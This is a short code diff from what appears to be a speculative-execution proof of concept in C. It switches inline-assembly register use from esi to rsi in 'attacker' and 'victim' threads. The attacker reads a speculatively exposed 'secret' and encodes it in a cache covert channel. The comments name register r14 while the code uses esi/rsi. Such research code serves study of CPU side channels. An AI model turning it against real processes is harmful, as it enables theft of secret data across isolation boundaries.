@@ -12,7 +12,7 @@ static volatile unsigned char stop = 0;
 // Sleep for an predetermined amount of time specified in register r14
 void __attribute__((noinline)) in_place() {
   size_t time = 0;
-	asm volatile("mov %%esi, %0\n\t" : "=r"(time));
+	asm volatile("mov %%rsi, %0\n\t" : "=r"(time));
 
   usleep(time);
   return;
@@ -20,7 +20,7 @@ void __attribute__((noinline)) in_place() {
 
 void* __attribute__((noinline)) attacker() {
   // Attacker is going to sleep for 65
-  asm volatile("mov $65, %esi\t\n"); // 65 is 'A'
+  asm volatile("mov $65, %rsi\t\n"); // 65 is 'A'
 
   while(!stop) {
     // Put to sleep
@@ -28,7 +28,7 @@ void* __attribute__((noinline)) attacker() {
     in_place();
     size_t secret = 0;
     // Retrieve secret data from register r14
-    asm volatile("mov %%esi, %0\n\t": "=r"(secret));
+    asm volatile("mov %%rsi, %0\n\t": "=r"(secret));
 
     // Encode data in covert channel
     cache_encode(secret);
@@ -37,7 +37,7 @@ void* __attribute__((noinline)) attacker() {
 
 void* __attribute__((noinline)) victim() {
   // Victim is going to sleep for 83
-	asm volatile("mov $83, %esi\t\n"); // 83 is 'S'
+	asm volatile("mov $83, %rsi\t\n"); // 83 is 'S'
   while(!stop) {
     // Call function and return here after misspeculation is detected
     in_place();
